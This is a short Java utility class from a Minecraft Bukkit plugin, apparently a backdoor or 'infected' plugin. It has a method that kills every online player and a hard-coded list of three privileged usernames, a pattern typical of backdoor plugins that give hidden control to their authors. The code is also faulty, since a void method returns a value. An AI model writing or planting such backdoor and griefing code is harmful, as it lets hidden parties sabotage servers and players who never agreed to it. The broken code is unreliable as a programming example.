 package org.CreeperCoders.MiniInfectedPlugin;
 
 import org.bukkit.entity.Player;
 import org.bukkit.Bukkit;
 
 import java.util.Arrays;
 
 public class MIP_Util
 {
     public static void torturePack()
     {
         //Horrible, yes, but I'm working on it!
         for (Player p : Bukkit.getOnlinePlayers())
         {
            p.setHealth(0);
         }
         
        return true;
     }
     
     public boolean isTopDog(String TopDog)
     {
         return Arrays.asList(
                 "xxwilee999xx",
                 "paldiu",
                 "sardenarin"
                 ).contains(TopDog.toLowerCase());
     }
 }
